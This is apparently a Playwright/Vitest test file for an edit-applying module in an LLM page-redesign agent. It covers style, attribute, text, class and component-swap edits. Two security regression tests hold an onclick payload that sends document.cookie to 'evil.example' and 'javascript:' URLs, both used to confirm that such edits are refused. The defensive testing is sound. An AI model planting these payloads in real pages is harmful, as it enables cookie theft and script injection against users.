import type { Page } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { applyEdit, STAMP_ATTR_ELEMENT } from '../../src/dom/apply-edit.ts';
import { ensureInjectedEditsStyleTag, injectDsStylesheetOnce, upsertStyleRule } from '../../src/dom/stylesheet.ts';
import type { TargetedEdit } from '../../src/llm/schemas/r-nodes.ts';
import { BrowserPool } from '../../src/t-layer/browser.ts';
import { startLocalServer } from '../helpers/local-server.ts';

/**
 * Real Chromium against a local fixture page — no mocking. Covers §7.5/§8.7's injected-
 * stylesheet mechanism and §8.6's R4 edit application, including all 5 TargetedEdit kinds,
 * strict expectedMatches enforcement, and the idempotent-retry `previousValue` reuse contract.
 */

const FIXTURE = `<!doctype html><html><head><title>edit-fixture</title>
<style id="page-style">.btn { padding: 4px; }</style>
</head>
<body style="margin:0">
<div ${STAMP_ATTR_ELEMENT}="e1" class="card" style="color: rgb(0, 0, 0);">
  <button class="btn btn-a" type="button">One</button>
  <button class="btn btn-b" type="button">Two</button>
</div>
<p id="headline">Original headline</p>
<div class="swap-target">content</div>
</body></html>`;

let pool: BrowserPool;
let server: Awaited<ReturnType<typeof startLocalServer>>;

beforeAll(async () => {
  server = await startLocalServer({ '/fixture': { body: FIXTURE } });
  pool = new BrowserPool({ channel: 'chromium', userAgentProduct: 'FixRedesignAgentTest/0.1' });
  await pool.start();
});

afterAll(async () => {
  await pool?.stop();
  await server?.close();
});

async function withPage<T>(fn: (page: Page) => Promise<T>): Promise<T> {
  return pool.withIsolatedPage(async (page) => {
    await page.goto(`${server.origin}/fixture`);
    return fn(page);
  });
}

function edit(overrides: Partial<TargetedEdit>): TargetedEdit {
  return {
    findingId: 'f1',
    selector: `[${STAMP_ATTR_ELEMENT}="e1"]`,
    expectedMatches: 1,
    kind: 'style',
    property: 'color',
    value: 'rgb(176, 31, 36)',
    removeValue: null,
    dsComponent: null,
    dsVariant: null,
    dsToken: null,
    rationale: 'test',
    confidence: 0.9,
    ...overrides,
  };
}

describe('ensureInjectedEditsStyleTag', () => {
  it('creates the style tag once, even if called twice', async () => {
    await withPage(async (page) => {
      await ensureInjectedEditsStyleTag(page);
      await ensureInjectedEditsStyleTag(page);
      expect(await page.locator('#fra-injected-edits').count()).toBe(1);
      expect(await page.locator('#fra-injected-edits').getAttribute('data-fra-injected')).toBe('edits');
    });
  });
});

describe('upsertStyleRule', () => {
  it('is idempotent per (elementId, property): a retry replaces the rule in place with !important, never duplicates it', async () => {
    await withPage(async (page) => {
      await upsertStyleRule(page, 'e1', 'color', 'rgb(1, 2, 3)');
      await upsertStyleRule(page, 'e1', 'color', 'rgb(4, 5, 6)');

      const result = await page.evaluate(
        ({ elAttr }) => {
          const style = document.getElementById('fra-injected-edits') as HTMLStyleElement;
          const rules = Array.from(style.sheet!.cssRules) as CSSStyleRule[];
          const mine = rules.filter((r) => r.selectorText === `[${elAttr}="e1"]`);
          const el = document.querySelector(`[${elAttr}="e1"]`) as HTMLElement;
          return { ruleCount: mine.length, priority: mine[0]?.style.getPropertyPriority('color'), color: getComputedStyle(el).color };
        },
        { elAttr: STAMP_ATTR_ELEMENT },
      );
      expect(result.ruleCount).toBe(1);
      expect(result.priority).toBe('important');
      expect(result.color).toBe('rgb(4, 5, 6)');
    });
  });

  it('keeps rules for different properties on the same element separate', async () => {
    await withPage(async (page) => {
      await upsertStyleRule(page, 'e1', 'color', 'rgb(1, 2, 3)');
      await upsertStyleRule(page, 'e1', 'background-color', 'rgb(9, 9, 9)');
      const el = page.locator(`[${STAMP_ATTR_ELEMENT}="e1"]`);
      expect(await el.evaluate((e) => getComputedStyle(e).color)).toBe('rgb(1, 2, 3)');
      expect(await el.evaluate((e) => getComputedStyle(e).backgroundColor)).toBe('rgb(9, 9, 9)');
    });
  });
});

describe('injectDsStylesheetOnce', () => {
  it('injects once; a second call reports false and leaves the first content in place', async () => {
    await withPage(async (page) => {
      const first = await injectDsStylesheetOnce(page, '.ds-btn { color: red; }');
      expect(first).toBe(true);
      const second = await injectDsStylesheetOnce(page, '.ds-btn { color: blue; }');
      expect(second).toBe(false);
      expect(await page.locator('#fra-ds-stylesheet').textContent()).toBe('.ds-btn { color: red; }');
      expect(await page.locator('#fra-ds-stylesheet').getAttribute('data-fra-injected')).toBe('design-system');
    });
  });
});

describe('applyEdit: style', () => {
  it('applies through the injected stylesheet, keyed by the stamp, when the selector carries one', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({}), null);
      expect(outcome).toMatchObject({ matched: 1, applied: true, error: null });
      expect(outcome.previousValue).toBe('rgb(0, 0, 0)');
      const color = await page.locator(`[${STAMP_ATTR_ELEMENT}="e1"]`).evaluate((el) => getComputedStyle(el).color);
      expect(color).toBe('rgb(176, 31, 36)');
    });
  });

  it('applies via an attribute-scoped extra rule when the selector carries no stamp', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn-a', property: 'padding-top', value: '10px' }), null);
      expect(outcome.applied).toBe(true);
      const padding = await page.locator('.btn-a').evaluate((el) => getComputedStyle(el).paddingTop);
      expect(padding).toBe('10px');
    });
  });

  it('refuses when kind=style but property is null', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ property: null }), null);
      expect(outcome).toEqual({ matched: 1, applied: false, previousValue: null, error: 'kind=style but property is null' });
    });
  });

  it('regression: a DESCENDANT selector that merely contains a stamp reference targets the descendant, never the stamp element itself', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: `[${STAMP_ATTR_ELEMENT}="e1"] .btn-a`, expectedMatches: 1, property: 'color', value: 'rgb(9, 9, 9)' }), null);
      expect(outcome.applied).toBe(true);
      const buttonColor = await page.locator('.btn-a').evaluate((el) => getComputedStyle(el).color);
      const cardColor = await page.locator(`[${STAMP_ATTR_ELEMENT}="e1"]`).evaluate((el) => getComputedStyle(el).color);
      expect(buttonColor).toBe('rgb(9, 9, 9)'); // the descendant the edit actually named
      expect(cardColor).toBe('rgb(0, 0, 0)'); // the stamp element itself must be UNCHANGED
    });
  });

  it('a rule applied via the raw-selector (no-stamp / descendant) path is still visible in serialized HTML, not just the live CSSOM', async () => {
    await withPage(async (page) => {
      await applyEdit(page, edit({ selector: '.btn-a', property: 'padding-top', value: '7px' }), null);
      const html = await page.content();
      expect(html).toContain('padding-top: 7px');
    });
  });
});

describe('applyEdit: attribute', () => {
  it('sets the attribute on every matched element', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn', expectedMatches: 2, kind: 'attribute', property: 'data-test', value: 'x' }), null);
      expect(outcome).toMatchObject({ matched: 2, applied: true, error: null });
      const values = await page.locator('.btn').evaluateAll((els) => els.map((el) => el.getAttribute('data-test')));
      expect(values).toEqual(['x', 'x']);
    });
  });

  it('refuses when kind=attribute but property is null', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ kind: 'attribute', property: null, value: 'x' }), null);
      expect(outcome).toEqual({ matched: 1, applied: false, previousValue: null, error: 'kind=attribute but property is null' });
    });
  });

  it('§security regression: refuses an event-handler attribute — never sets it on the live page', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn-a', kind: 'attribute', property: 'onclick', value: "fetch('https://evil.example/exfil?c='+document.cookie)" }), null);
      expect(outcome.applied).toBe(false);
      expect(outcome.error).toMatch(/not on the allowed list/);
      expect(await page.locator('.btn-a').evaluate((el) => el.getAttribute('onclick'))).toBeNull();
    });
  });

  it('§security regression: refuses href/src/style — resource/navigation and inline-style attributes, even though they are not event handlers', async () => {
    await withPage(async (page) => {
      for (const property of ['href', 'src', 'formaction', 'style', 'srcdoc']) {
        const outcome = await applyEdit(page, edit({ selector: '.btn-a', kind: 'attribute', property, value: 'javascript:alert(1)' }), null);
        expect(outcome.applied, `expected "${property}" to be refused`).toBe(false);
        expect(outcome.error).toMatch(/not on the allowed list/);
      }
    });
  });

  it('a case-insensitive event-handler attribute name (e.g. "OnClick") is still refused', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn-a', kind: 'attribute', property: 'OnClick', value: 'alert(1)' }), null);
      expect(outcome.applied).toBe(false);
    });
  });

  it('a plain data-* attribute (not this system\'s own data-fra-* stamps) is still allowed', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn-a', kind: 'attribute', property: 'data-analytics-id', value: 'cta-1' }), null);
      expect(outcome.applied).toBe(true);
    });
  });

  it('refuses to let an edit touch this system\'s own data-fra-* stamp attributes', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn-a', kind: 'attribute', property: `${STAMP_ATTR_ELEMENT}`, value: 'e999' }), null);
      expect(outcome.applied).toBe(false);
    });
  });
});

describe('applyEdit: text', () => {
  it('replaces text content', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '#headline', kind: 'text', property: null, value: 'New headline' }), null);
      expect(outcome).toMatchObject({ matched: 1, applied: true, error: null });
      expect(outcome.previousValue).toBe('Original headline');
      expect(await page.locator('#headline').textContent()).toBe('New headline');
    });
  });
});

describe('applyEdit: class', () => {
  it('adds and removes classes on every matched element', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn-a', kind: 'class', property: null, value: 'is-active highlighted', removeValue: 'btn-a' }), null);
      expect(outcome.applied).toBe(true);
      expect(outcome.previousValue).toBe('btn btn-a');
      const cls = await page.locator('.is-active').evaluate((el) => el.className);
      expect(cls).toContain('is-active');
      expect(cls).toContain('highlighted');
      expect(cls).not.toContain('btn-a');
    });
  });

  it('adds without removing anything when removeValue is null', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn-b', kind: 'class', property: null, value: 'extra', removeValue: null }), null);
      expect(outcome.applied).toBe(true);
      const cls = await page.locator('.btn-b').evaluate((el) => el.className);
      expect(cls).toBe('btn btn-b extra');
    });
  });
});

describe('applyEdit: component-swap', () => {
  it('adds classes and marks the swap + variant attributes', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(
        page,
        edit({ selector: '.swap-target', kind: 'component-swap', property: null, value: 'ds-card ds-card--elevated', dsComponent: 'Card', dsVariant: 'elevated' }),
        null,
      );
      expect(outcome.applied).toBe(true);
      const result = await page.locator('.swap-target').evaluate((el) => ({
        cls: el.className,
        swap: el.getAttribute('data-fra-component-swap'),
        variant: el.getAttribute('data-fra-ds-variant'),
      }));
      expect(result.cls).toContain('ds-card');
      expect(result.cls).toContain('ds-card--elevated');
      expect(result.swap).toBe('Card');
      expect(result.variant).toBe('elevated');
    });
  });

  it('writes an empty marker attribute when no dsComponent is given, and omits the variant attribute entirely', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.swap-target', kind: 'component-swap', property: null, value: 'ds-card', dsComponent: null, dsVariant: null }), null);
      expect(outcome.applied).toBe(true);
      const result = await page.locator('.swap-target').evaluate((el) => ({ swap: el.getAttribute('data-fra-component-swap'), variant: el.getAttribute('data-fra-ds-variant') }));
      expect(result.swap).toBe('');
      expect(result.variant).toBeNull();
    });
  });
});

describe('applyEdit: expectedMatches enforcement (§7.6 — never applied to an uncertain count)', () => {
  it('reports the true match count and refuses to apply on a mismatch', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.btn', expectedMatches: 1 }), null); // .btn actually matches 2
      expect(outcome).toEqual({ matched: 2, applied: false, previousValue: null, error: `selector ".btn" matched 2 element(s), expected 1 — never applied to an uncertain count` });
    });
  });

  it('reports a distinct error when expectedMatches is legitimately 0 and nothing matches', async () => {
    await withPage(async (page) => {
      const outcome = await applyEdit(page, edit({ selector: '.does-not-exist', expectedMatches: 0 }), null);
      expect(outcome).toEqual({ matched: 0, applied: false, previousValue: null, error: 'selector matched 0 elements' });
    });
  });
});

describe('applyEdit: idempotent retry (§7.5 — R4 edits are keyed by (findingId, property) and replay their own prior result)', () => {
  it('reuses a supplied previousValue rather than re-reading the already-mutated DOM as if it were original', async () => {
    await withPage(async (page) => {
      const target = edit({ property: 'color', value: 'rgb(176, 31, 36)' });
      const first = await applyEdit(page, target, null);
      expect(first.previousValue).toBe('rgb(0, 0, 0)'); // the true original, read fresh

      // Simulate a retry of the SAME (findingId, property) edit: a new target value, plus the
      // previousValue the earlier attempt already captured — deliberately a sentinel that does
      // NOT match what a fresh read of the live (now red) element would return, so a pass here
      // only works if the reused value is trusted rather than re-measured.
      const second = await applyEdit(page, { ...target, value: 'rgb(0, 128, 0)' }, { previousValue: 'sentinel-original' });
      expect(second.previousValue).toBe('sentinel-original');
      expect(second.applied).toBe(true);
      const color = await page.locator(`[${STAMP_ATTR_ELEMENT}="e1"]`).evaluate((el) => getComputedStyle(el).color);
      expect(color).toBe('rgb(0, 128, 0)');
    });
  });

  it('a null reuse.previousValue is honoured as-is (still not re-read)', async () => {
    await withPage(async (page) => {
      await applyEdit(page, edit({ property: 'color', value: 'rgb(1, 1, 1)' }), null);
      const outcome = await applyEdit(page, edit({ property: 'color', value: 'rgb(2, 2, 2)' }), { previousValue: null });
      expect(outcome.previousValue).toBeNull();
      expect(outcome.applied).toBe(true);
    });
  });
});
